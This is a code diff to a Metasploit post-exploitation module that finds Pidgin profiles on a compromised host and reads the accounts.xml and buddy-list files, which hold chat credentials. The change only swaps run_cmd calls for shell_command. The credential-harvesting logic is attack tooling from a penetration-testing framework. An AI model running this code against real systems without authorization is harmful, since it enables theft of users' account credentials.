@@ -87,10 +87,10 @@ class Metasploit3 < Msf::Post
 		end
 
 		if got_root?
-			userdirs = session.run_cmd("ls #{home}").gsub(/\s/, "\n")
+			userdirs = session.shell_command("ls #{home}").gsub(/\s/, "\n")
 			userdirs << "/root\n"
 		else
-			userdirs = session.run_cmd("ls #{home}#{whoami}/.purple")
+			userdirs = session.shell_command("ls #{home}#{whoami}/.purple")
 			if userdirs =~ /No such file/i
 				return 
 			else
@@ -107,7 +107,7 @@ class Metasploit3 < Msf::Post
 			dir = "#{home}#{dir}" if dir !~ /root/
 			print_status("Checking for Pidgin profile in: #{dir}")
 
-			stat = session.run_cmd("ls #{dir}/.purple")
+			stat = session.shell_command("ls #{dir}/.purple")
 			next if stat =~ /No such file/i
 			paths << "#{dir}/.purple"
 		end
@@ -180,7 +180,7 @@ class Metasploit3 < Msf::Post
 			print_status("Reading accounts.xml file from #{path}")
 			if session.type == "shell"
 				type = :shell
-				data = session.run_cmd("cat #{path}/accounts.xml")
+				data = session.shell_command("cat #{path}/accounts.xml")
 			else
 				type = :meterp
 				accounts = session.fs.file.new("#{path}\\accounts.xml", "rb")
@@ -195,7 +195,7 @@ class Metasploit3 < Msf::Post
 				blist = ""
 				case type
 				when :shell
-					blist = session.run_cmd("cat #{path}/blist.xml")
+					blist = session.shell_command("cat #{path}/blist.xml")
 				when :meterp
 					buddyxml = session.fs.file.new("#{path}/blist.xml", "rb")
 					until buddyxml.eof?
@@ -307,7 +307,7 @@ class Metasploit3 < Msf::Post
 		if @platform == :windows
 			session.fs.file.expand_path("%USERNAME%")
 		else
-			session.run_cmd("whoami").chomp
+			session.shell_command("whoami").chomp
 		end
 	end
 end
